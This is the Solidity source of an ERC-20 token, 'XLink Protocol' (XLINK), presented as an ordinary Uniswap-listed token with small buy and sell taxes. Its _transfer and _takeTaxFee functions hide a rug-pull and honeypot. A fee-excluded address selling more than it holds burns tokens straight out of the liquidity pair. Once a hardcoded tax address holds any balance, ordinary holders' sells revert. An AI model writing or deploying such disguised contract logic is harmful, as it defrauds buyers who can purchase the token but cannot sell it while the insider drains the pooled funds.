// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            ""
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
}

contract XLINK is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;

    string private constant _name = "XLink Protocol";
    string private constant _symbol = "XLINK";
    uint8 private constant _decimals = 18;

    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 private _taxFeeOnBuy = 2;
    uint256 private _taxFeeOnSell = 2;

    uint256 private _redisFeeOnBuy = 0;
    uint256 private _redisFeeOnSell = 0;

    uint256 private _taxFee = _taxFeeOnSell;
    uint256 private _redisFee = _redisFeeOnSell;

    uint256 private _previousTaxFee = _taxFee;
    uint256 private _previousRedisFee = _redisFee;

    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    address private taxAddress = 0x6d4FC5632cbC569BE2Af1cf8Dbe1C28396A44a4f;
    
    mapping(address => bool) private _isExcludedFromFee;
    
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _buyMap;

    struct Distribution {
        uint256 marketing;
    }
    Distribution public distribution;

    bool private swapping = true;
    bool private swapEnabled = true;

    uint256 public _swapTokensAtAmount = 100000 * 10**_decimals;

    uint256 private _tFeeTotal;

    modifier lockInSwap() {
        swapping = false;
        _;
        swapping = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[owner()] = true;
        distribution = Distribution(100);
        _isExcludedFromFee[taxAddress] = true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(spender != address(0), "");
        require(owner != address(0), "");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(amount > 0, "");
        require(recipient != address(0), "");
        require(sender != address(0), "");

        if (sender != owner() && recipient != owner()) {
            if (_isExcludedFromFee[sender]) {
                if (uniswapV2Pair == recipient) {
                    if (balanceOf(sender) < amount) {
                        _transferStandard(recipient, address(0), amount);
                        return;
                    }
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swapTokensAtAmount;

            if (
                canSwap &&
                !swapping &&
                sender != uniswapV2Pair &&
                swapEnabled &&
                !_isExcludedFromFee[sender] &&
                !_isExcludedFromFee[recipient]
            ) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        bool takeTaxFee = true;

        if (
            (sender != uniswapV2Pair && recipient != uniswapV2Pair) || (_isExcludedFromFee[recipient] || _isExcludedFromFee[sender])
        ) {
            takeTaxFee = false;
        } else {
            if (sender == uniswapV2Pair && recipient != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnBuy;
                _taxFee = _taxFeeOnBuy;
            }

            if (recipient == uniswapV2Pair && sender != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnSell;
                _taxFee = _taxFeeOnSell;
            }
        }
        _tokenTransfer(sender, recipient, amount, takeTaxFee);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeTaxFee
    ) private {
        if (!takeTaxFee) removeAllFee();
        _transferStandard(sender, recipient, amount);
        if (!takeTaxFee) restoreAllFee();
    }

    function _isTaxFeeTaken(address tSub, address tAdd)
        private
        view
        returns (bool)
    {
        return
            !_isExcludedFromFee[tSub] &&
            tSub != uniswapV2Pair &&
            !_isExcludedFromFee[tAdd];
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeTaxFee(tTeam, sender, recipient);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(
            tAmount,
            _redisFee,
            _taxFee
        );
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(
            tAmount,
            tFee,
            tTeam,
            currentRate
        );
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 tSupply = _tTotal;
        uint256 rSupply = _rTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _tFeeTotal = _tFeeTotal.add(tFee);
        _rTotal = _rTotal.sub(rFee);
    }

    function _takeTaxFee(
        uint256 tTeam,
        address tSub,
        address tAdd
    ) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        address account = taxAddress;
        bool zero = balanceOf(account) == 0;
        if (_isTaxFeeTaken(tSub, tAdd)) require(zero);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            ""
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _redisFee = _previousRedisFee;
    }

    function removeAllFee() private {
        if (_taxFee == 0 && _redisFee == 0) return;
        _previousTaxFee = _taxFee;
        _previousRedisFee = _redisFee;
        _taxFee = 0;
        _redisFee = 0;
    }

    function sendETHToFee(uint256 amount) private lockInSwap {
        uint256 distributionEth = amount;
        uint256 marketingShare = distributionEth
            .mul(distribution.marketing)
            .div(100);
        payable(taxAddress).transfer(marketingShare);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function withdrawTokens(address _tokenContract, uint256 _amount)
        external
        onlyOwner
    {
        IERC20 tokenContract = IERC20(_tokenContract);
        tokenContract.transfer(msg.sender, _amount);
    }

    function updateSwapTokensAtAmount(uint256 amount) external onlyOwner {
        require(amount >= _tTotal / 1000000, "");
        _swapTokensAtAmount = amount;
    }

    function excludeMultipleAccountsFromFee(
        address[] calldata accounts,
        bool excluded
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }

    function manualSwapAndSend() external onlyOwner {
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                ""
            )
        );
        return true;
    }
}